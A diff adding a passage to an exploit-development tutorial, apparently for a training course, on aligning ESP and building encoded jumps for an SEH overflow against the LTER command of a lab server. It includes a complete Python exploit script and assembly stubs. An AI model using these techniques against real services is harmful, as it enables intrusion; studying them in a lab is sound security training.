@@ -656,6 +656,98 @@ Once we send this, we should see our encoded long jump payload get decoded and t
 As you can see, our `CALL EBX` instruction pops out of thin air onto our stack and we eventually will pass control to it and jump back to the beginning of our `A` buffer!
 
 ### Finally, Our Last Payload
+You know what time it is. It's time to do the thing we already did twice one more time, except this time, with reverse shell shellcode instead of jumps. 
+
+Let's first align `ESP` to the absolute bottom of our padding before our encoded second jump. We land here, at `017CF20A`. 
+
+![](/assets/images/CTP/land.JPG)
+
+`ESP` is `017CFFB7`. 
+
+The bottom of our `A` buffer before we hit our `espAdj2` code is `017CFF6C`. So to find out how much we need to adjust `ESP` we do: (`017CFFB7` - `017CFF6C` = `4B`). So we need to subtract `4B` from our `ESP` register value. To the Assembly:
+```terminal_session
+nasm > push esp
+00000000  54                push esp
+nasm > pop eax
+00000000  58                pop eax
+nasm > sub ax, 0x4b
+00000000  6683E84B          sub ax,byte +0x4b
+nasm > push eax
+00000000  50                push eax
+nasm > pop esp
+00000000  5C                pop esp
+```
+
+So our `espAdj3` code is going to be: `\x54\x58\x2c\x4b\x50\x5c`
+
+Let's add and test it. Our exploit code now looks like this:
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+
+Seh = '\x2b\x17\x50\x62'
+
+espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
+
+jump = ""
+jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
+jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
+jump += "\x50" 
+
+espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'
+
+longJump = "\x54\x5b"
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
+longJump += "\x05\x11\x11\x66\x62" ## add  eax, 0x62661111
+longJump += "\x05\x11\x11\x55\x42" ## add  eax, 0x42551111
+longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+longJump += "\x50"                 ## push eax
+longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+longJump += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
+longJump += "\x05\x40\x75\x54\x06" ## add  eax, 0x06547540
+longJump += "\x50"
+
+espAdj3 = '\x54\x58\x2c\x4b\x50\x5c'
+
+buffer = espAdj3
+buffer += 'A' * (3427 - len(espAdj3))
+buffer += espAdj2
+buffer += longJump
+buffer += 'A' * (3514 - 3427 - len(espAdj2) - len(longJump))
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += jump
+buffer += 'D' * (4000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+After stepping through it, we see that `ESP` is pointed at `018BFF6C` just like we wanted. 
+
+![](/assets/images/CTP/finaladj.JPG)
+
+
+
+
 
 
 
